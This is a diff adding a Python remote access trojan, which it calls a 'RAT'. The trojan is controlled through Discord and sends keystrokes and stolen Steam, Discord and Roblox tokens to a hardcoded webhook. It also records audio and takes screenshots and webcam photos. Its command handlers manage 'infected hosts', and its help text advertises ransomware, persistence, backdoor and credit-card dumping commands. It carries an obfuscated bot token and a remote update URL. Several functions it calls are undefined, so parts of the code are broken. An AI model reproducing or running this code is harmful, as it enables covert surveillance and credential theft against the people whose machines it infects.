@@ -1,0 +1,320 @@
+import discord
+import asyncio
+import requests
+import json
+import os
+import threading
+from discord.ext import commands
+from pynput.keyboard import Listener
+import wave
+import pyaudio
+import cv2
+from PIL import ImageGrab
+import time
+from Crypto.Cipher import AES
+import base64
+import logging
+import shutil
+
+# Webhook for sending messages to Discord
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3ezsAbq8aH1jpTo9lPFuasPty_GDeixcUZTiZ6XyiiUausIJ_DIDPZS76IVH"
+
+# Obfuscated Token for bot authentication
+TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg"[::-1] + ".oF0Ep8O1x3LEe96eNd5lf0Frfx6q9Jq0KqBJFA"[::-1]
+
+# GitHub URL for auto-downloading the bot control script
+BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/bot_control_encrypted.txt"
+
+intents = discord.Intents.default()
+intents.message_content = True
+client = commands.Bot(command_prefix="!", intents=intents)
+
+# Initialize logging
+logging.basicConfig(level=logging.DEBUG)
+
+# Helper function to send messages to Discord webhook
+def send_to_discord(message):
+    try:
+        payload = {"content": message}
+        response = requests.post(WEBHOOK_URL, json=payload)
+        if response.status_code == 204:
+            logging.info("Data sent to Discord successfully")
+        else:
+            logging.error(f"Failed to send data to Discord: {response.status_code}")
+    except Exception as e:
+        logging.error(f"Webhook failed: {e}")
+
+# Helper function to log key presses
+def log_keystroke(key):
+    try:
+        key = str(key).replace("'", "")
+        if "Key" not in key:
+            logging.info(key)
+            send_to_discord(key)
+    except Exception as e:
+        logging.error(f"Keylogging failed: {e}")
+
+# Start keylogger
+def start_keylogger():
+    with Listener(on_press=log_keystroke) as listener:
+        listener.join()
+
+# Function to capture and save audio
+def record_audio(duration=30):
+    try:
+        p = pyaudio.PyAudio()
+        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
+        frames = []
+        for i in range(0, int(44100 / 1024 * duration)):
+            data = stream.read(1024)
+            frames.append(data)
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        filename = f"audio_{int(time.time())}.wav"
+        with wave.open(filename, 'wb') as wf:
+            wf.setnchannels(1)
+            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
+            wf.setframerate(44100)
+            wf.writeframes(b''.join(frames))
+        send_to_discord(f"Audio recorded and saved as {filename}")
+    except Exception as e:
+        logging.error(f"Audio recording failed: {e}")
+
+# Function to capture a screenshot
+def capture_screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        filename = f"screenshot_{int(time.time())}.png"
+        screenshot.save(filename)
+        send_to_discord(f"Screenshot captured successfully: {filename}")
+    except Exception as e:
+        logging.error(f"Screenshot capture failed: {e}")
+
+# Function to capture webcam photo
+def capture_webcam():
+    try:
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        if ret:
+            filename = f"webcam_{int(time.time())}.png"
+            cv2.imwrite(filename, frame)
+            send_to_discord(f"Webcam photo saved as {filename}")
+        cap.release()
+    except Exception as e:
+        logging.error(f"Webcam capture failed: {e}")
+
+# Function to dump Steam session information
+def steam_dump():
+    try:
+        steam_token = None
+        steam_path = os.path.join(os.getenv('APPDATA'), 'Steam', 'userdata')
+        for root, dirs, files in os.walk(steam_path):
+            for file in files:
+                if file == 'loginusers.vdf':
+                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
+                        data = f.read()
+                        if 'steamid' in data:
+                            steam_token = data.split('steamid')[1].split('"')[1]
+                            send_to_discord(f"Steam token found: {steam_token}")
+        if not steam_token:
+            send_to_discord("No Steam token found.")
+    except Exception as e:
+        logging.error(f"Steam dump failed: {e}")
+
+# Function to dump Discord token
+def discord_dump():
+    try:
+        discord_token = None
+        appdata = os.getenv('APPDATA')
+        for root, dirs, files in os.walk(appdata):
+            for file in files:
+                if file == 'Local\\Discord\\app-0.0.309\\settings.json':
+                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
+                        data = f.read()
+                        if 'token' in data:
+                            discord_token = data.split('token')[1].split('"')[1]
+                            send_to_discord(f"Discord token found: {discord_token}")
+        if not discord_token:
+            send_to_discord("No Discord token found.")
+    except Exception as e:
+        logging.error(f"Discord dump failed: {e}")
+
+# Function to dump Roblox token
+def roblox_dump():
+    try:
+        roblox_token = None
+        roblox_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Roblox', 'ClientSettings')
+        for root, dirs, files in os.walk(roblox_path):
+            for file in files:
+                if file == 'client-settings.json':
+                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
+                        data = f.read()
+                        if 'cookie' in data:
+                            roblox_token = data.split('cookie')[1].split('"')[1]
+                            send_to_discord(f"Roblox token found: {roblox_token}")
+        if not roblox_token:
+            send_to_discord("No Roblox token found.")
+    except Exception as e:
+        logging.error(f"Roblox dump failed: {e}")
+
+# Function to dump Minecraft session information
+def minecraft_dump():
+    try:
+        minecraft_token = None
+        minecraft_path = os.path.join(os.getenv('APPDATA'), '.minecraft', 'launcher_profiles.json')
+        if os.path.exists(minecraft_path):
+            with open(minecraft_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+                if 'auth_player_name' in data:
+                    minecraft_token = data['auth_player_name']
+                    send_to_discord(f"Minecraft session found: {minecraft_token}")
+        if not minecraft_token:
+            send_to_discord("No Minecraft token found.")
+    except Exception as e:
+        logging.error(f"Minecraft dump failed: {e}")
+
+# Function to perform file exfiltration (grab files like passwords, etc.)
+def exfiltrate_files():
+    try:
+        # You can add more targeted scanning logic here (for example, searching for files with passwords)
+        # Example for testing:
+        files = [f for f in os.listdir() if f.endswith('.txt')]  # Change this to your specific scan
+        for file in files:
+            send_to_discord(f"Exfiltrated file: {file}")
+    except Exception as e:
+        logging.error(f"File exfiltration failed: {e}")
+
+# Function to execute commands based on input
+async def on_message(message):
+    if message.author == client.user:
+        return
+
+    if message.content.startswith("!keylogger start"):
+        logging.info("Starting keylogger...")
+        threading.Thread(target=start_keylogger).start()
+
+    elif message.content.startswith("!keylogger stop"):
+        logging.info("Stopping keylogger...")
+        # No stop logic yet, as keylogger runs until terminated manually (use !selfdestruct)
+
+    elif message.content.startswith("!record_audio"):
+        try:
+            duration = int(message.content.split(" ")[1])  # Example: !record_audio 30
+            logging.info(f"Recording audio for {duration} seconds...")
+            record_audio(duration)
+        except IndexError:
+            logging.error("Duration for audio recording not provided")
+            send_to_discord("Usage: !record_audio <duration>")
+
+    elif message.content.startswith("!screenshot"):
+        logging.info("Capturing screenshot...")
+        capture_screenshot()
+
+    elif message.content.startswith("!start_webcam"):
+        logging.info("Capturing webcam image...")
+        capture_webcam()
+
+    elif message.content.startswith("!steamdump"):
+        logging.info("Dumping Steam token...")
+        steam_dump()
+
+    elif message.content.startswith("!discorddump"):
+        logging.info("Dumping Discord token...")
+        discord_dump()
+
+    elif message.content.startswith("!robloxdump"):
+        logging.info("Dumping Roblox token...")
+        roblox_dump()
+
+    elif message.content.startswith("!minecraftdump"):
+        logging.info("Dumping Minecraft session...")
+        minecraft_dump()
+
+    elif message.content.startswith("!exfil_all"):
+        logging.info("Starting full exfiltration...")
+        exfiltrate_files()
+
+    elif message.content.startswith("!selfdestruct"):
+        logging.info("Triggering self-destruction...")
+        self_destruct()
+
+    elif message.content.startswith("!update_rat"):
+        logging.info("Updating RAT from GitHub...")
+        update_rat()
+
+    elif message.content.startswith("!swap_host "):
+        try:
+            new_host = message.content.split(" ")[1]
+            if new_host in infected_hosts:
+                current_host = new_host
+                send_to_discord(f"Switched to host: {new_host}")
+            else:
+                send_to_discord(f"Host {new_host} not found.")
+        except Exception as e:
+            logging.error(f"Failed to swap host: {e}")
+
+    elif message.content.startswith("!rename_host "):
+        try:
+            old_name, new_name = message.content.split(" ")[1], message.content.split(" ")[2]
+            if old_name in infected_hosts:
+                infected_hosts[new_name] = infected_hosts.pop(old_name)
+                send_to_discord(f"Host renamed from {old_name} to {new_name}")
+            else:
+                send_to_discord(f"Host {old_name} not found.")
+        except Exception as e:
+            logging.error(f"Failed to rename host: {e}")
+
+    elif message.content == "!list_hosts":
+        try:
+            if infected_hosts:
+                host_list = "\n".join(infected_hosts.keys())
+                send_to_discord(f"Currently infected hosts:\n{host_list}")
+            else:
+                send_to_discord("No infected hosts found.")
+        except Exception as e:
+            logging.error(f"Failed to list hosts: {e}")
+
+    elif message.content == "!status":
+        try:
+            send_to_discord(f"Currently in host: {current_host}")
+        except Exception as e:
+            logging.error(f"Failed to get status: {e}")
+
+    elif message.content == "!help":
+        help_message = """
+        Available commands:
+        - `!list_accounts`: Lists all phished accounts (Discord, Minecraft, Steam, Roblox).
+        - `!dump_wifi`: Dumps Wi-Fi credentials.
+        - `!start_webcam`: Takes a screenshot using the webcam.
+        - `!exfiltrate <path>`: Exfiltrates files from the specified path.
+        - `!start_ransomware`: Starts the ransomware module.
+        - `!install_persistence`: Installs persistence on the system.
+        - `!self_destruct`: Initiates self-destruct sequence.
+        - `!open_backdoor <ip>:<port>`: Opens a backdoor on the specified IP and port.
+        - `!get_ip`: Gets the public IP and geolocation information.
+        - `!record_audio`: Records audio from the microphone.
+        - `!steamdump`: Dumps phished Steam data.
+        - `!minecraftdump`: Dumps phished Minecraft data.
+        - `!robloxdump`: Dumps phished Roblox data.
+        - `!discorddump`: Dumps phished Discord data.
+        - `!ccdump`: Dumps phished credit card data.
+        - `!swap_host <host>`: Swaps to the specified host.
+        - `!rename_host <old_name> <new_name>`: Renames the specified host.
+        - `!list_hosts`: Lists all currently infected hosts.
+        - `!status`: Shows the current host status.
+        - `!help`: Displays this help message.
+        """
+        send_to_discord(help_message)
+
+    else:
+        send_to_discord(f"Unknown command: {message.content}")
+
+async def setup():
+    await client.start(TOKEN)
+
+# Main loop
+if __name__ == '__main__':
+    loop = asyncio.get_event_loop()
+    loop.create_task(setup())
+    loop.run_forever()
